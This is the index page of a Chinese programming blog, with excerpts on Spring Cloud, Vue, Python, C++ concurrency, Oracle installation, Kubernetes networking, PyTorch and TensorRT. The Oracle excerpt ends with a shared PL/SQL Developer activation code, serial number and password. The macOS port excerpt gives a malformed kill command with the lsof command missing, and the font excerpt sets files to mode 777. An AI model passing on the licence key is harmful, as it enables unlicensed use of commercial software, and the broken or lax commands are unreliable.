<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21e42367ebb1dae7a18325a1922407dd/" rel="bookmark">
			6-3 SpringCloud快速开发入门: Feign实现服务消费的熔断及熔断的异常信息获取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接上一章节声明式服务消费 Feign实现消费者,这里讲讲Feign实现服务消费的熔断及熔断的异常信息获取
Feign实现服务消费的熔断 服务熔断：
1、在 application.properties文件开启 hystrix功能
feign.circuitbreaker.enabled=true 2、指定熔断回调逻辑
@FeignClient(name = "springcloud-service-provider",fallback = MyFallback.class) @Component public class MyFallback implements FeignService { @Override public String hello() { //逻辑处理 return "发生异常"; } } 给服务提供者2的/service/provide路径的方法添加个异常,重新启动服务提供者2,测试熔断 启动feign服务,测试熔断
当负载均衡调用到服务提供者2的时候,熔断成功
Feign获取服务消费熔断的异常信息 服务熔断获取异常信息：
为@FeignClient修饰的接口加上 fallback方法可以实现远程服务发生异常后进行服务的熔断，但是不能获取到远程服务的异常信息，如果要获取远程服务的异常信息,此时可以使用 fallbackFactory
@FeignClient(name = "springcloud-service-provider",fallbackFactory = MyFallbackFactory.class) @Component public class MyFallbackFactory implements FallbackFactory&lt;FeignService&gt; { @Override public FeignService create(Throwable throwable) { return new FeignService() { @Override public String hello() { //异常信息 System.out.println(throwable.getMessage()); return throwable.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21e42367ebb1dae7a18325a1922407dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f740e6888e1f5f475918a768e751972/" rel="bookmark">
			mac系统提示Address localhost:80 is already in use(使用tomcat8080端口被占用)解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一：打开终端（command+空格，搜索终端）
输入-i:8080
目的查看8080端口给谁用了，如果输入之后没有反应（权限不够）
解决方法：在-i:8080前面加sudo
可以发现8080端口被java占用了
我们需要结束它
继续输入sudo kill -1805（1805是图片中的PID,是要根据自己电脑的数字的）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a987cbc7fc539a96731b3f00192ab2a7/" rel="bookmark">
			Python-猜词小游戏（优化）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据对random模块的导入运用公式在Python中显示
对之前做的猜成语游戏进行注释，方便理解
while ...... or ...... ：
while
while ...... and ...... ：
if ......：
import *
使用python 3.11版本 使用windows10系统操作
更新优化后的代码如下：
#Guess_Word.py(猜单词游戏) #import导入库模块 import random #导入随机模块 #Input CIYU=('python','入木三分','java','引人入胜','顾左右而言他','狗嘴里吐不出象牙') print("""&lt;欢迎猜成语把乱序的组合 合成一个正确的成语&gt;""") #Process is_continue='Y' while is_continue=="Y" or is_continue=="y": ciyu=random.choice(CIYU)#从序列中随机跳出一个单词 correct=ciyu #创建一个用于判断玩家是否猜对带变量 jumble='' while ciyu: position=random.randrange(len(ciyu))#根据变量带长度产生 jumble+=ciyu[position]#jumble=jumble+word[position] 将Position位置带字母组合到乱序后的单词变量里 ciyu=ciyu[0:position]+ciyu[(position+1):]#将position位置的字母从原单词中删除 #Output print("乱序后:",jumble) guess=input("\n猜吧小伙儿：") while guess !=correct and guess !="": print('不行啊小伙儿!') guess = input("继续整?") if guess==correct: print("哎，对咯！") is_continue=input("继续不大兄弟（Y/N）:") 调试后效果：
初始状态
猜对
猜错
其中需要注意的是，此题注重与对乱序方式的应用与对position的理解
否则将会造成打乱错误，或者直接不打乱的执行结果或者直接错误报错
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbe5377dd771b4f33b4d06c878d3df54/" rel="bookmark">
			算法题--哈希（两数之和、给定差值的组合、最小权重路径解法加步骤）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
哈希算法思想
题目
两数之和
原题链接
解析
核心思想
答案
给定差值的组合
题目描述
解答要求
解析
核心思想
答案
最佳路径
题目描述
解答要求
解析
核心思想
递归步骤
答案
哈希算法思想 利用对象属性作为key值，通过唯一个key值，访问对应的存储的值。相当于形成映射关系，便于直接查找值。
例如一个数组有a、b、c三数，我们可以借用一个对象obj，让obj["a"]=1、obj["b"]=1、obj["c"]=1，当我们需要查找该数组中是否包含d的时候就不需要遍历每个数，只需要判断obj["d"]是否等于1即可。
题目 两数之和 给出一个整型数组 numbers 和一个目标值 target，请在数组中找出两个加起来等于目标值的数的下标，返回的下标按升序排列。
（注：返回的数组下标从1开始算起，保证target一定可以由数组里面2个数字相加得到）
输入：[3,2,4],6
返回值：[2,3]
说明：因为 2+4=6 ，而 2的下标为2 ， 4的下标为3 ，又因为 下标2 &lt; 下标3 ，所以返回[2,3]
输入：[20,70,110,150],90
返回值：[1,2]
说明：20+70=90
原题链接 两数之和_牛客题霸_牛客网
解析 核心思想 由于需要判断两数相加等于目标值的，所以可以采用减法，用目标值减去当前数对数组的每一位判断是否满足条件，得出下面注释的方法。
通过hash算法优化，将目标值减去当前数作为属性，当前数的序号作为值，当数组中有对应属性的值时即满足相加为目标值，返回序号。
答案 // 不使用hash算法，直接穷举 // function twoSum(numbers, target) { // let tmp = -1 // for (let i = 0; i &lt; numbers.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbe5377dd771b4f33b4d06c878d3df54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e19e8d176137c454fcf9ebaadc38ea33/" rel="bookmark">
			SpringBoot&#43;Vue登录注册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先创建Login.vue
如何创建一个表单
注意：el-form必须写 :model 否则无法使用表单校验功能
&lt;el-form-item&gt;不能少
&lt;el-form :model="user" :rules="rules" ref="userForm"&gt; &lt;el-form-item prop="username"&gt; &lt;el-input size="medium" style="margin: 10px 0" prefix-icon="el-icon-user" v-model="user.username" placeholder="请输入账号"&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;el-form-item prop="password"&gt; &lt;el-input size="medium" style="margin: 10px 0" prefix-icon="el-icon-lock" show-password v-model="user.password" placeholder="请输入密码"&gt;&lt;/el-input&gt; &lt;/el-form-item&gt; &lt;el-form-item style="margin: 10px 0; text-align: right"&gt; &lt;el-button type="primary" size="small" autocomplete="off" @click="login()"&gt;登录&lt;/el-button&gt; &lt;el-button type="warning" size="small" autocomplete="off"&gt;注册&lt;/el-button&gt; &lt;/el-form-item&gt; &lt;/el-form&gt; 然后在script中的computed中写表单校验ref="userForm"
//表单校验 computed: { rules() { return { username: [ { required: true, message: '用户名不能为空', trigger: 'blur' }, { min: 3, max: 20, message: '用户名不合法', trigger: 'blur' } ], password: [ { required: true, message: '密码不能为空', trigger: 'blur' }, { min: 6, max: 20, message: '密码格式不正确', trigger: 'blur' } ], } } }, 然后在提交按钮的方法中添加
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e19e8d176137c454fcf9ebaadc38ea33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18f83fab05e5cd76eae2ff857faa677d/" rel="bookmark">
			C&#43;&#43;并发编程（十一）多线程应用的测试和除错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		测试和除错也是开发中的一个关键步骤，并发的代码的测试和除错更加困难。要掌握一些排错的技法，首先得了解错误可能出现的地方。
目录
1.与并发相关的错误类型
1.1多余的阻塞
1.2条件竞争
2.定位并发相关错误的方法
2.1审查代码并定位潜在错误
2.2通过测试定位与并发相关的错误
2.3设计可测试的代码
2.4多线程测试技术
2.4.1强力测试（压力测试）
2.4.2组合模拟测试
2.4.3采用特殊的程序可检测错误
2.5以特定结构组织多线程的测试代码
2.6测试多线程代码的性能
1.与并发相关的错误类型 某些类型的错误与并发的使用直接关联，这些并发错误主要分为两类：
1.多余的阻塞
2.条件竞争
两个大类可以进一步细分。
1.1多余的阻塞 若某线程等待某项条件成立或某一状态出现，而无法执行任务，该状态被称为阻塞。等待的目标可能是互斥、条件变量、future或I/O操作。阻塞有几种变化：死锁（线程相互等待）、活锁（线程相互等待，区别在于活动状态的循环，如自旋锁）、I/O阻塞或其它外部阻塞（等到外部输入而阻塞，应避免一个线程等另一个，另一个却等外部输入）。
1.2条件竞争 条件竞争是各种问题的常见诱因，许多死锁、活锁只是条件竞争的表现形式。当多个独立线程因调度导致相对次序有异，其上的操作又取决于这种差异，才会出现条件竞争。多数条件竞争为良性，如：就任务队列而言，由哪个线程执行下一项任务根本无关紧要，但是条件竞争经常造成如下问题：
数据竞争：由于对共享区域内的并发访问缺乏同步措施，导致未定义行为。
受破坏的不变量：
·悬空指针：当前线程正通过指针访问目标数据，而其它线程却同时删除指针。
·随机内存数据的破坏：数据更新到一半，其他线程同时读取，造成数据不一致。
·重复释放内存：两个线程同时从队列弹出相同的值，同时删除关联的数据。
错误的同步方式会破坏特定次序导致不变量破坏。
生存期问题：线程的生存期超过其访问数据的生存期。主要表现为：数据被删除后，线程仍试图访问。情形：局部变量引用在线程函数结束前传到函数外部，线程在作用范围以外访问失效或销毁变量。
以上三类问题均会产生可见后果（崩溃、错误输出），它们可能在代码的任何部分造成问题。
[多线程安全基本要求：若我们以join手动结束线程，要保证join()调用不会因异常而跳过]
2.定位并发相关错误的方法 代码经过全面审查，还是可能出现错误，在任何情况下，我们至少确保代码能够运作，我们先从代码审查开始，逐步过渡到多线程代码测试的方法。
2.1审查代码并定位潜在错误 通过审查代码找出错误，最关键在于“彻底”。在条件允许下，尽可能让别人审查自己的代码，他人往往能从不同角度出发发现自己疏忽的地方，同时能避免自己按照原来的设计思路理解而难以辨别错误。或者实在找不到他人，也可以先搁置一段时间，潜意识会暗自思考问题，等代码变得稍微陌生，可能就会从不同角度它。另一种方式是自问自答，向自己解释一遍代码工作逻辑，思考每段代码访问的数据，会产生什么效果等。
此处列举几个建议考虑的具体问题，我们还可以根据需要提出其他问题：
进行并发访问需要保护哪些数据？
如何确保数据受保护？
若当前线程在操作受保护数据，其他线程可能在执行什么代码？
当前线程有哪些互斥？
其他线程可能有哪些互斥？
当前线程和其他线程上的操作需要什么次序？
当前线程读取的数据是否仍合法、有效？数据是否可能已由别的线程修改？
假定其他线程可能以并发方式改动数据，那么改动的发生条件和影响是什么？
最后一个问题提出了明确要求：如果一份数据有指针或引用形式，它们能被数据作用域之外的代码轻易获取，我们对其处理就必须额外谨慎，对象所含的公有数据成员也是如此。
2.2通过测试定位与并发相关的错误 对于单线程应用软件，原则上我们可以找出所有可能的输入数据集，如果应用软件的行为符合预期并产生真正的结果，即可保证它在某个数据集上正确运行。
而多线程代码的测试却异常困难，因为多线程调度次序不可能精准确定，它们随着应用软件的多次运行而有异。尽管输入相同的数据，软件每次运行的情况也不唯一。
代码在多线程上运行报错，不一定与并发有关，若将代码改为单线程，错误依旧存在，则就是与并发无关的错误。若并发软件在多核处理器上有错误，转到单核系统上错误消失，则很有可能与同步操作或内存次序有关。
普通代码的测试主要针对逻辑结构，并发代码则还需另行测试更多项目，并且还要考虑代码自身结构（比如：全空、全满队列上，分别并发调用push()和pop()的多种组合情况）和测试环境（如：测试多线程的数目，处理器架构，硬件系统的处理器内核）。
2.3设计可测试的代码 要使代码相对容易测试，通常要做到以下几点：
·每个函数和类的职责明确
·接受测试的目标代码处于测试环境中
·函数短小精悍
·执行特定操作的代码汇聚在一起
·着手编写前，先想清楚如何对齐进行测试
相比单线程代码，多线程代码的设计应更关注代码的可测试性，在编写代码前，想清楚如何测试（如采用哪些输入、错误可能在哪些条件下产生、如何按可能的方式触发代码错误等）。
另一种方式是把代码拆分为几个部分，一部分专门处理线程通信，另一部分则在单线程内部操作数据。针对单线程的部分就能用普通的测试手段，并发代码负责处理线程间通信，保证特定数据互斥地访问。如：把软件设计成状态机，每个线程处理一个状态；将代码划分为读取数据、转换数据、更新共享数据三个部分，其中转换数据部分是单线程，多线程测试部分简化为数据读取和更新。
库函数的调用可能会以内部变量存储状态，当多个线程使用通一个库函数，可能无意中共享了内部变量，需要施以安全措施，或替换为安全并发的函数。
2.4多线程测试技术 为了验证线程的准确性，要尽可能地发现线程的错误，使线程复现报错的调度次序。有几种实现的方法。
2.4.1强力测试（压力测试） 让代码承受压力运行，往往需要多次运行代码，可能在同一测试中发起许多线程，假设代码按某种特定调度编排才会发生错误，则运行次数越多，错误就越可能被发现。我们的置信程度随着测试次数的增加而增加，其增长率因代码量的增加而降低（测试目标代码量大，多线程调度次序的编排组合会暴增，即便通过多轮测试，置信度仍然较低）。
强力测试可能导致错误的置信，若导致错误的环境只存在于特定系统中，测试系统与之不同，则无法复现错误。经典例子是在单处理器系统上测试多线程应用，许多错误只有在多处理器系统上出现（条件变量和缓存乒乓（两个CPU频繁轮流读写同一数据块，在两者缓存间不断切换））。而且在不同架构处理器中，同步功能和内存次序机制也不同。
因此如果我们要将应用软件移植到多个平台上，就有必要从各类平台中，选择有代表意义的系统进行专门测试。还要仔细设计驱动测试的代码，令测试尽量涵盖所有的代码路径，记录已经测试和尚未测试的功能。
2.4.2组合模拟测试 用特定软件模拟真实运行环境，在其中运行测试代码。我们知道虚拟机能模拟出各种特性和硬件配置的环境。而模拟软件没有完全虚拟出系统，而是记录每个线程上的数据访问、所操作和原子操作构成的序列，然后以C++内存模型为准则，重新组合前面所记录的操作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18f83fab05e5cd76eae2ff857faa677d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/500a272177d9f41b9dac664673130b53/" rel="bookmark">
			WINDOWS安装Oracle11.2.0.4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(一)Oracle服务器端安装 1.运行Oracle11g服务器端安装程序setup.exe,弹出如下界面： 2.如上界面中，把默认打上的勾去掉，然后点击【下一步】，弹出如下界面： 3.如上界面中，选择跳过软件更新,然后点击【下一步】,弹出如下界面： 4.如上界面中，默认创建和配置数据库(可避免后续一些列问题)，可同时创建和配置数据库，这里以“仅安装数据库软件”为例介绍步骤。选择【仅安装数据库软件】，然后点击【下一步】，弹出如下界面： 5.如上界面中，安装类型默认选择第一个选项桌面类，然后点击【下一步】，弹出如下界面： 6.如上界面中，全局数据库名改为orcl，输入密码,然后点击【下一步】，弹出如下界面： 7.如上界面中，如上界面中，等待完成 8.如上界面中，点击【安装 】，弹出如下安装界面： 9.如上界面中，安装完成后，弹出如下界面： 10.如上界面中，点击【关闭】退出完成安装。 (二)Oracle客户端安装 1.运行Oracle11g客户端安装程序setup.exe,弹出如下界面： 2.如上界面中，安装类型选中【管理员】，然后点击【下一步】，弹出如下界面： 3.如上界面中,选择跳过软件更新，然后点击【下一步】，弹出如下界面： 4.如上界面中，语言选择【简体中文】，然后点击【下一步】，弹出如下界面： 5.以上界面中，点击【浏览】按钮选择Oracle基目录和Oracle软件位置，然后点击【下一步】，弹出如下执行先决条件检查界面： 6.如上界面中，点击【安装】，弹出如下安装界面： 7.如上界面中，安装完成后，弹出如下界面： 8.如上界面中，点击【安装】，弹出如下安装界面： 9.如上界面中，点击【关闭】退出完成安装。 PLSQL 激活
product code: ke4tv8t5jtxz493kl8s2nn3t6xgngcmgf3
serial Number: 264452
password: xs374ca
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d54987beda5f83eb501abfa6a25b1954/" rel="bookmark">
			Pytorch运行过程中解决出现内存不足的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 前提 利用Transformer模型进行O3浓度的反演
2. 问题 2.1 速度慢 一开始模型是在CPU上面跑的，为了加快速度，我改成了在GPU上跑
方法如下：
1、验证pytorch是否存在GPU版本
在Pycharm命令行输入
import torch print(torch.cuda.is_available) # 若输出为True,则存在GPU版本 # 若输出为False,则不存在GPU版本 我的输出为True，说明pytorch是存在GPU版本的
2、将模型从CPU版本转换到GPU版本
声明使用GPU（指定具体的卡）
PS：torch.device()是装torch.Tensor的一个空间。 device=torch.device('cuda' if torch.cuda.is_available() else 'cpu') # 'cuda' 这里如果没有指定具体的卡号,系统默认cuda:0 device = torch.device('cuda:2') # 使用2号卡 将模型（model）加载到GPU上 model = Transformer()	#例子中，采用Transformer模型 model.to(device) 将数据和标签放到GPU上【注意！什么数据可以被放入GPU-Tensor类型的数据】 # 只有Tensor类型的数据可以放入GPU中 # 可以一个个【batch_size】进行转换 inputs = inputs.to(device) labels = labels.to(device) 如果结果还是显示你是在CPU上进行训练，要不就是模型没有加进去，要不就是数据没有加进去
2.2 内存不足 在使用CPU时，出现了内存不足的情况 RuntimeError: [enforce fail at C:\cb\pytorch_1000000000000\work\c10\core\impl\alloc_cpu.cpp:72] data. DefaultCPUAllocator: not enough memory: you tried to allocate 280410627200 bytes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d54987beda5f83eb501abfa6a25b1954/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bef0004e47ff24e66c520e5587f33f65/" rel="bookmark">
			echarts整理集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		全部集合案例：
一、折线图
完整代码：
&lt;div id="main"&gt;&lt;/div&gt; const echarts = require("echarts"); data(){ myChart: null, } mounted() { this.echartsInit(); window.addEventListener("resize", () =&gt; { this.myChart.resize(); }); }, methods: { echartsInit() { var chartDom = document.getElementById("main"); this.myChart = echarts.init(chartDom); var option; option = { // title: { // text: "Stacked Line", // }, tooltip: { trigger: "axis", }, legend: { data: ["农产品", "农资"], padding: [18, 0, 0, 0], }, grid: { left: "3%", right: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bef0004e47ff24e66c520e5587f33f65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de8bc25974a8d19e33c72c126d82371e/" rel="bookmark">
			tcp_tw_recycle 参数导致的K8S网络问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题现象 客户端访问对端服务器端口，时通时不通。
多数服务出现连接nacos 500问题
排查记录 检查服务到nacos的连接是否正常
通过进入到容器当中，去ping external-nacos.default.svc.cluster.local 可ping通 排查 nacos 状态，检查nacos是否正常
所有的中间件连接信息，均是通过nacos配置中心来获取配置kubectl get ep external-nacos.default.svc.cluster.local逐一访问 endpoint 均正常 客户端telnet数据库端口，发现时通时不通
检查k8s 集群 cni mtu 发现，值为1430,初步怀疑是服务与应用交互的数据包过大，导致的超时，尝试修改cni插件的MTU值为1480。一般比物理网卡小20即可
2. kubectl -n kube-system edit ds calico-node
重启服务，发现故障依旧
结合以往故障记录，由于k8s的pod均是使用的nat模式访问目标机器，怀疑目标机器未开启路由转发，登录到目标机器，查看确实未开启，追加后，重启服务器，故障依旧
登录到目标主机抓包,抓包分析发现收到包之后三次握手不成功，只有客户端发送过来的SYN包，并没有服务端返回的SYN+ACK包，所以无法建立连接。
$ tcpdump -i ens192 host 192.168.10.121 and port 22 -w a.cap` $ tcpdump -i ens192 host 192.168.10.122 and port 22 -w b.cap` $ tcpdump -i ens192 host 192.168.10.123 and port 22 -w c.cap` 8. 返回查看内核参数，发现有net.ipv4.tcp_tw_recycle参数，以前看别人遇到过类似问题https://www.jianshu.com/p/3b8f674f577e，该参数在4.12版本内核之后被废除，发现目标节点为3.10版本内核，尝试关闭此参数，重启服务，故障恢复
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de8bc25974a8d19e33c72c126d82371e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb45fd26f908b1ab24d23d128ab7517c/" rel="bookmark">
			超详细的 Python 文件操作知识！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		👇👇关注后回复 “进群” ，拉你进程序员交流群👇👇
作者：python2021_
https://blog.csdn.net/python2021_/article/details/124793497
python进行文件操作，在日常编程中是很常用的。为了方便大家，这里对各种文件操作的知识进行汇总。一文在手，无须它求！来一起学习吧。 一、文件的打开和关闭 open()函数 f1 = open(r'd:\测试文件.txt', mode='r', encoding='utf-8') content = f1.read() print(content) f1.close() with open(r'd:\测试文件.txt', mode='r', encoding='utf-8') as f1: content = f1.read() print(content) open()内置函数，open底层调用的是操作系统的接口。
f1变量，又叫文件句柄，通常文件句柄命名有f1，fh，file_handler，f_h，对文件进行的任何操作，都得通过文件句柄.方法的形式。
encoding:可以不写。不写参数，默认的编码本是操作系统默认的编码本。windows默认gbk，linux默认utf-8，mac默认utf-8。
mode:可以不写。默认mode='r'。
f1.close()关闭文件句柄。
使用with open()的好处。
优点1：不用手动关闭文件句柄。 with open('文件操作的读', encoding='utf-8') as f1: print(f1.read()) 优点2：一个语句可以操作多个文件句柄。 with open('文件操作的读', encoding='utf-8') as f1, \ open('文件操作的写', encoding='utf-8', mode='w') as f2: print(f1.read()) f2.write('hahaha') 绝对路径和相对路径 绝对路径：指的是绝对位置，完整地描述了目标的所在地，所有目录层级关系是一目了然的。比如：C:/Users/chris/AppData/Local/Programs/Python/Python37/python.exe
相对路径：是从当前文件所在的文件夹开始的路径。
test.txt：是在当前文件夹查找 test.txt 文件。
./test.txt：也是在当前文件夹里查找test.txt文件， ./ 表示的是当前文件夹，可以省略。
../test.txt：从当前文件夹的上一级文件夹里查找 test.txt 文件。 ../ 表示的是上一级文件夹。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb45fd26f908b1ab24d23d128ab7517c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46c70c03a7adcd39ad58eaa6c9a8c55a/" rel="bookmark">
			v-model 双向绑定原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，v-model是什么 v-model就是vue的双向绑定的指令，能将页面上控件输入的值同步更新到相关绑定的data属性，也会在更新data绑定属性时候，更新页面上输入控件的值。
二，为什么使用v-model v-model作为双向绑定指令也是vue两大核心功能之一，使用非常方便，提高前端开发效率。在view层，model层相互需要数据交互，即可使用v-model。
三，v-model的原理简单描述 v-model主要提供了两个功能，view层输入值影响data的属性值，data属性值发生改变会更新view层的数值变化。以下以input控制绑定v-model举例说明。
&lt;!DOCTYPE html &gt; &lt;html lang = "en" &gt; &lt;head &gt; &lt;meta charset = "UTF-8" &gt; &lt; /head &gt; &lt;body &gt; &lt;div id = "app" &gt; &lt;p &gt;{{name}} &lt; /p &gt; &lt; input type = "text" v-model = "name" / &gt; &lt; /div &gt; &lt; /body &gt; &lt; /html &gt; 3.1 input 输入值后更新data 首先在页面初始化时候，vue的编译器会编译该html模板文件，将页面上的dom元素遍历生成一个虚拟的dom树。再递归遍历虚拟的dom的每一个节点。当匹配到其是一个元素而非纯文本，则继续遍历每一个属性。
如果遍历到v-model这个属性，则会为这个节点添加一个input事件，当监听从页面输入值的时候，来更新vue实例中的data想对应的属性值。
/ / 假如node是遍历到的 input节点 no de.addEventListener( "input", function(e){ vm.name =e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46c70c03a7adcd39ad58eaa6c9a8c55a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1023c764d4bb5175e1a41aafa83b6fd/" rel="bookmark">
			Linux安装字体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公司使用一个应用系统，系统是用java写的，部署在一台linux服务器上，审批日志自始至终显示乱码
经分析，需要在linux系统中安装中文字体：
simhei.ttf
simsun.ttc
simsunb.ttf
Linux安装字体方法：
安装fontconfig，安装完成后，会在/usr/share/创建fonts目录，上传字体文件到这个目录，对字体文件授权，更新字体索引及缓存，确认字体是否安装成功
[root@test fonts] yum install fontconfig [root@test ~]# cd /usr/share/font fontconfig/ fonts/ [root@test ~]# cd /usr/share/fonts/ [root@test fonts]# ls dejavu [root@test fonts]# rz rz waiting to receive. zmodem trl+C ȡ 100% 9524 KB 1587 KB/s 00:00:06 0 Errors 100% 17787 KB 1368 KB/s 00:00:13 0 Errors 100% 16664 KB 1388 KB/s 00:00:12 0 Errors [root@testeasytrack fonts]# ls dejavu simhei.ttf simsunb.ttf simsun.ttc [root@test fonts]# chmod +777 simhei.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1023c764d4bb5175e1a41aafa83b6fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42930d66ac564e639dae562a4e25a17d/" rel="bookmark">
			python List和常用的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		List：用[ ]定义，列表中包含多个数据，数据之间使用逗号分隔，索引从0开始。
空列表：
dir：查看列表的所有方法
List常用方法：insert、append，extend、del、remove、pop、clear、count、index
增加insert(索引，数据)再list指定位置插入成员数据append(数据)再list末尾追加成员数据extend(列表)追加一个list的成员数据到另一个list中删除del(列表[索引值])删除list中指定索引的成员数据remove(成员数据值)删除list中第一次出现的指定数据pop()删除list中最后一个成员数据pop(索引值)删除list中指定索引值的数据clear()清空list修改list[索引值] = 值（要修改的）统计count(数据)返回指定值再list中出现的次数index(数据)返回数据在list中的索引值，找不到会抛出异常排序sort()list值按照升序排序sort(reverse=True)list值按照降序排序reverse()列表的成员数据顺序反转（逆置） insert：在指定索引位置插入
append： 追加，在末尾添加
extend：将一个列表的成员追加到另一个列表中
修改列表中的成员值：
del：删除列表中的成员
remove：移除list面指定的值
pop：删除list的最后一个索引的成员数据
pop删除列表中指定索引的成员数据 clear：删除列表中所有的成员
count：指定成员数据再列表中出现的次数
index：成员数据再列表中的索引值
index：从起始位置开始查找数据再列表中的索引值
sort：对列表成员从小到大排序
sort：列表成员从大到小排序
reverse（）：列表的成员数据顺序反转（逆置）
拆包写法：
列表推导式：当需要创建一个比较大的list时使用。
添加条件：
常用方法：len、max、min、in
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dffddd4ee613e358f53d65069f6728a0/" rel="bookmark">
			Windows上TensorRT部署记录入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导语 TensorRT是英伟达的AI加速推理模型，我们在使用GPU深度学习训练完后，会生成.pt模型，但是这个模型在推理时不够快，这时候就需要转化成trt模型，使用c++利用TensorRT API编写程序进行快速推理。
一.CUDA下载安装 本人下载的版本是cuda11.6,cudnn8.4,正好对应上的，当然cuda版本要能支持你的GPU，cuda版本太高你的GPU跑不了，cuda版本太低也不好。
运行命令提示符cmd,输入图中指令查看自己显卡信息
如图所示，我的电脑显卡是3050ti,驱动版本是516.91，CUDA版本是11.7，对应关系如下图：
这里只提供一部分，更前的和随着40系显卡的出现，这张表肯定会落后，如图，我的显卡版本正好卡在11.7update1和11.8GA之间，我下了11.6update2版本。 CUDA下载官网：CUDA Toolkit Archive | NVIDIA Developer
如图，日期左侧是下载，右侧是官方安装教程，找到自己合适的版本下载安装即可。
二.CUDNN下载 cuda和cudnn是一对双胞胎，缺一不可，不过cudnn无需安装，只需下载。
CUDA默认的安装路径是C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.6
过一会需要频繁往里添加文件。
cudnn下载版本要和CUDA对应，官网地址：cuDNN Archive | NVIDIA Developer
我找的是cudnn8.4,正好对应cuda11.6
下载好之后解压缩，目录如下图：
其中bin文件夹存放的是Windows上的.dll动态库文件，将里面的所有dll文件复制粘贴到cuda安装路径下bin文件夹下；
其中include文件夹存放的是头文件.h，将所有.h文件复制粘贴到CUDA安装目录下的include目录下；
其中lib文件夹存放的是Windows上的.lib静态库文件，将里面所有lib文件复制粘贴到CUDA安装目录下的C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.6\lib\x64目录下。
